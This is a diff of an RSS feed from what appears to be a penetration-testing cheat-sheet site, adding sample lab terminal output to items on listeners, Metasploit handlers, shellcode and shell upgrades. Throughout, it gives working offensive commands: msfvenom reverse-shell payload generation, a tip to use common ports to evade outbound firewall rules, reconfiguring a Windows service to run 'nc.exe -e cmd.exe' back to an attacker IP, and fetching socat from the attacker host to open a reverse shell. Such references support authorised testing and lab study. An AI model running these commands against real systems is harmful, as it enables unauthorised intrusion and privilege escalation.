@@ -19,21 +19,21 @@
       <link>https://tldrbins.github.io/listeners/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/listeners/</guid>
-      <description>Listener Tools nc ncat pwncat rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp &amp;lt;LOCAL_PORT&amp;gt; pwncat-cs -lp &amp;lt;LOCAL_PORT&amp;gt; # After getting a connection back Ref: pwncat</description>
+      <description>Listener Tools nc ncat pwncat rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap ncat -lvnp 1337 Ncat: Version 7.94SVN ( https://nmap.org/ncat ) Ncat: Listening on [::]:1337 Ncat: Listening on 0.0.0.0:1337 pwncat-cs -lp &amp;lt;LOCAL_PORT&amp;gt; # After getting a connection back $ pwncat-cs -lp 1337 [11:43:14] Welcome to pwncat 🐈! __main__.py:164 [11:43:25] received connection from 10.</description>
     </item>
     <item>
       <title>Metasploit Listener</title>
       <link>https://tldrbins.github.io/metasploit_listener/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_listener/</guid>
-      <description>Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules&#xA;If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; set AutoRunScript multi_console_command -r automigrate.</description>
+      <description>Start a Metasploit Listener msfconsole -q $ msfconsole -q msf6 &amp;gt; use exploit/multi/handler msf6 &amp;gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcp payload =&amp;gt; windows/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; msf6 exploit(multi/handler) &amp;gt; set lhost 10.10.14.31 lhost =&amp;gt; 10.10.14.31 set lport &amp;lt;LOCAL_PORT&amp;gt; msf6 exploit(multi/handler) &amp;gt; set lport 1337 lport =&amp;gt; 1337 run msf6 exploit(multi/handler) &amp;gt; run [*] Started reverse TCP handler on 10.10.14.31:1337 Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
     </item>
     <item>
       <title>Metasploit Shellcode</title>
       <link>https://tldrbins.github.io/metasploit_shellcode/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
-      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.dll Windows x86 Staged exe Stageless exe msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
+      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe $ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 &amp;gt; rev.exe No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
     </item>
     <item>
       <title>Oracle Database</title>
@@ -68,14 +68,14 @@
       <link>https://tldrbins.github.io/server_operators/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/server_operators/</guid>
-      <description>Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; # Start service sc.exe stop &amp;lt;SERVICE&amp;gt; Additional: Create service # Create a service sc.exe create &amp;lt;NEW_SERVICE&amp;gt; binpath= C:\ProgramData\rev.exe start= auto Note: there is a space after named arguments</description>
+      <description>Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.exe config VSS binpath=&amp;#34;C:\windows\tasks\nc.exe -e cmd 10.10.14.44 443&amp;#34; [SC] ChangeServiceConfig SUCCESS 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.exe stop VSS [SC] ControlService FAILED 1062: The service has not been started. # Start service sc.exe stop &amp;lt;SERVICE&amp;gt; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.</description>
     </item>
     <item>
       <title>Upgrade Shell</title>
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:&amp;lt;LOCAL_PORT&amp;gt; # In target machine wget -q http://&amp;lt;LOCAL_IP&amp;gt;/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; # In our local Linux machine export TERM=xterm-256color Ref: Download socat</description>
+      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
     </item>
   </channel>
 </rss>
